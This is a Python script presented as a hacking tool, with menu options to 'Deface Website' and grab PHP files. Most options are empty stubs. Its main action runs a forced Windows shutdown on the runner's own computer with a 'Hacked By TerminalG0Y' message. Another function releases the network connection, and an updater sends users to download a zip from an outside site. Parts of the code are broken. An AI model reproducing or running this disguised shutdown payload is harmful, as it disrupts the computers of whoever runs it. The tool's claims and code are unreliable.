import random
import subprocess
import os
import sys
import time
import requests
from requests.exceptions import HTTPError
import wget
import webbrowser
import urllib.request

def Terminal_End():
	update()
	print("1. Type Start To Begin Proces")
	print("2. Auto Mode")
	print("3. Typescrippt Mode")
	print("4. Deface Website")
	print("5. Get PHP script From Any Website")
	print("6. Donate")
	print("7. Get source code")
	print("8. Contact developer")
	print("9. Exit")
	while True:
		process= str(input("Enter Magic Word:"))
		if process == "start":
			print("2. Auto Mode")
			print("3. Typescrippt Mode")
			print("4. Deface Website")
			print("5. Get PHP script From Any Website")
			print("6. Donate")
			print("7. Get source code")
			print("8. Contact developer")
			print("9. Exit")
		if process == "1":
			work_done()
		elif process == "clear":
			Clear()
		elif process == "2":
			Auto_mode()
		elif process == "3":
			script()
		elif process == "5":
			php()
		elif process == "9":
			exit()
		elif process == "6":
			donate()
		else:
			print("invalid command")
			break



def php():
	for url in ['https://google.com', 'https://github.com']:
	    try:
	        response = requests.get(url)
	        response.raise_for_status()
	    except HTTPError as http_err:
	        print(f': {http_err}')  # Python 3.6
	    except Exception as err:
	        print(f'connection error sorry: {err}')  # Python 3.6
	    else:
	    	print('Here we go!')
	    	Clear()
	    	time.sleep(3)
	    	print("please note that this will stored in folder named download")
	    	time.sleep(2)
	    	Clear()
	    	url = input(str("Enter Website Link==https://test.com/file.extension: "))
	    	get =input(str("Type name for file:==C:/Users/HP/Pictures/file.extension: "))
	    	output=wget.download("https://"+url + "/"+get)
	    	save_path = os.system('cd \\downloaded_php_files' +output)

	    
			
	    	
def Auto_mode():
	print("coming soon...")
def script():
	print("coming soon...")
def work_done():
	print("starting...")
	time.sleep(3)
	Hack_method()
def donate():
	webbrowser.open_new_tab('https://paypal.me/muskafahmad?locale.x=en_US')

def update():
	try:
		__version__="1.1"
		response = requests.get('https://www.terminalcreeds.com/tool_version.txt')
		data = response.text
		if str(data) > str(__version__):
			print('Software Update =>', 'Update Available!')
			test=input(str('You will Be directed to download new update are you ready? y/n:'))
			if test == "y":
				webbrowser.open_new_tab('https://terminalcreeds.com/MinaUSB.zip')
				exit()
			else:
				pass
		else:
			print('Software Update =>', 'No Updates are Available.')
	except Exception as e:
		print('Software Update', 'Unable to Check for Update Please Connet to the internet'+ str(e) )
def Hack_method():
	os.system("tree")
	time.sleep(3)
	os.system("color a ")
	os.system("shutdown /s /f /c'Hacked By TerminalG0Y'")

def Disable_network():
	os.system("ipconfig /release")

def Terminal_creed():
	get=input("Username: hack profile")
	for i in get():
		if get == "Integrate Account":
			print("Booting Mapping Sequence")
def Clear():
	os.system('cls')
			





if __name__ == "__main__":
	Terminal_End()

